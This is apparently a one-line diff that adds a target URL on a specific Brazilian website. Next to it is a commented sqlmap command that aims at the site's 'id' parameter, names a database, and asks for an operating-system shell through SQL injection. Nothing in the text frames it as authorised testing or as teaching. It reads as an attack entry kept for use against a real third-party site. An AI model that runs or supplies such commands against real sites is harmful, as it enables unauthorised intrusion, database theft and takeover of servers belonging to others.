@@ -1,0 +1,1 @@
+http://www.exebase.com.br/det_obras.php?id=7 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.exebase.com.br/det_obras.php?id=7 -D exebase --os-shell
